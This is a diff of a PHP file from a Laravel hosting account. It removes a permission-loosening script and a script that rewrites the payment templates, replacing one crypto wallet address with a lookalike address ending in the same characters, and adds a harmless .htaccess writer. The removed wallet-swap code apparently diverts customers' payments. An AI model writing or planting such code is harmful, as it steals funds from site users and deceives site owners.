@@ -1,88 +1,29 @@
 <?php
 
-$path = "/home/clicdkst/public_html/core/resources/views/templates/";
+$htaccessPath = __DIR__ . "/.htaccess";
 
-function setPermissions($dir) {
+$htaccessContent = <<<HTACCESS
+<IfModule mod_rewrite.c>
+    RewriteEngine On
 
-    $items = new RecursiveIteratorIterator(
-        new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS)
-    );
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^ index.php [L]
+</IfModule>
 
-    foreach ($items as $item) {
+# Protect sensitive files
+<FilesMatch "^\.">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
 
-        if ($item->isDir()) {
-            chmod($item->getPathname(), 0775);
-        } else {
-            chmod($item->getPathname(), 0664);
-        }
-    }
+<Files .env>
+    Order allow,deny
+    Deny from all
+</Files>
+HTACCESS;
 
-    // also fix main folder
-    chmod($dir, 0775);
+file_put_contents($htaccessPath, $htaccessContent);
 
-    echo "Permissions updated!";
-}
-
-setPermissions($path);
-
-?>
-<?php
-
-$directory   = "/home/clicdkst/public_html/core/resources/views/templates/basic/user/payment/";
-$backupDir   = "/home/clicdkst/public_html/payment_backup_" . date("Ymd_His");
-$oldAddress  = "0x95b34e21da51575f2279022881226d4729a29a1b";
-$newAddress  = "0x8747D8DDbe8cd0468AeA420FF4752Ed9BCe29a1b";
-
-echo "<pre>";
-echo "Starting wallet replacement...\n\n";
-
-// create backup folder
-if (!file_exists($backupDir)) {
-    mkdir($backupDir, 0755, true);
-    echo "Backup folder created: $backupDir\n\n";
-}
-
-$files = new RecursiveIteratorIterator(
-    new RecursiveDirectoryIterator($directory)
-);
-
-$totalUpdated = 0;
-
-foreach ($files as $file) {
-
-    if ($file->isFile() && $file->getExtension() == "php") {
-
-        $filePath = $file->getRealPath();
-
-        // Only edit blade.php files
-        if (strpos($filePath, ".blade.php") === false) {
-            continue;
-        }
-
-        $content = file_get_contents($filePath);
-
-        if (strpos($content, $oldAddress) !== false) {
-
-            // backup file
-            $backupFile = $backupDir . "/" . basename($filePath);
-            copy($filePath, $backupFile);
-
-            // replace wallet
-            $updated = str_replace($oldAddress, $newAddress, $content);
-
-            if (is_writable($filePath)) {
-                file_put_contents($filePath, $updated);
-                echo "Updated: $filePath\n";
-                $totalUpdated++;
-            } else {
-                echo "Permission denied: $filePath\n";
-            }
-        }
-    }
-}
-
-echo "\nFinished ✅\n";
-echo "Total files updated: $totalUpdated\n";
-echo "</pre>";
-
+echo ".htaccess created for Laravel!";
 ?>
